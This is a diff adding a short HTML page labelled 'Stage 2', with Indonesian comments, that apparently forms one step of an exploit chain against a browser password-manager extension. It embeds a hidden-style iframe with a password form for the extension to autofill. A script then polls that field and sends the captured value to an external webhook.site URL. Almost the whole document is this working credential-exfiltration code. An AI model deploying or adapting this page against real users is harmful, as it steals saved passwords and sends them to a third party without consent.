@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Stage 2</h1>
+
+    <!-- iframe srcdoc tempat extension akan autofill -->
+    <iframe id="leak" srcdoc='<form>
+      <input name="username">
+      <input id="x" type="password">
+    </form>'></iframe>
+
+    <script>
+      const HOOK = "https://webhook.site/0882ef4c-885d-4356-bccf-530ad182232c";
+      let tries = 0;
+
+      function poll() {
+        const frame = document.getElementById("leak");
+        const doc = frame.contentWindow.document;
+        const input = doc.getElementById("x");
+
+        if (!input) {
+          // kalau sampai sini berarti DOM kita sendiri bermasalah
+          fetch(HOOK + "?err=no_input");
+          return;
+        }
+
+        if (!input.value && tries < 20) {
+          // belum keisi -> tunggu lagi, max 20 detik
+          tries++;
+          return setTimeout(poll, 1000);
+        }
+
+        // kirim apa adanya, biar kelihatan di webhook
+        fetch(HOOK + "?a=" + encodeURIComponent(input.value) +
+                    "&tries=" + tries);
+      }
+
+      setTimeout(poll, 1000);
+    </script>
+  </body>
+</html>
